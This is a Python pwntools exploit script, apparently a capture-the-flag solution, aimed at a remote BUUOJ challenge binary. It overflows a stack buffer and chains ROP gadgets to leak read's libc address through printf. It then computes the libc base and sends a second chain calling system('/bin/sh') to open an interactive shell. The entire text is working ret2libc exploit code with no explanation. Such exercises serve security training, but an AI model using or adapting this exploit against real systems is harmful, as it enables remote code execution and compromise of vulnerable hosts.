from pwn import *
from LibcSearcher import *
#context.log_level="debug"

#sh=process("./timu")
sh=remote("node4.buuoj.cn",28688)
elf=ELF("./timu")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc.so.6")

printf_plt=p64(elf.plt["printf"])
read_got=p64(elf.got["read"])
main_addr=p64(0x0000000000400636)
pop_rdi_ret=p64(0x0000000000400733)
pop_rsi_ret=p64(0x0000000000400731)
ret=p64(0x00000000004004d1)
format_str=p64(0x0000000000400770)

payload=0x28*b'a'+pop_rdi_ret+format_str+pop_rsi_ret+read_got+p64(0)+printf_plt+main_addr
sh.recv()
print("payload =",payload)
sh.sendline(payload)
#print("recv =",sh.recv())
sh.recvuntil(b'Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\nWelcome to the Pwn World again, ')
read_addr=u64(sh.recv(6).ljust(8,b'\x00'))
print("read_addr =",read_addr)

libc_base=read_addr-libc.sym["read"]
print("libc_base =",libc_base)
system_addr=p64(libc_base+libc.sym["system"])
bin_sh=p64(libc_base+next(libc.search(b"/bin/sh")))
#libc=LibcSearcher("printf",printf_addr)
#libc_base=printf_addr-libc.dump("printf")
#system_addr=p64(libc_base+libc.dump("system"))
#bin_sh=p64(libc_base+libc.dump("str_bin_sh"))

payload1=0x28*b'a'+ret+pop_rdi_ret+bin_sh+system_addr+p64(0xdeadbeef)
sh.sendline(payload1)

sh.interactive()
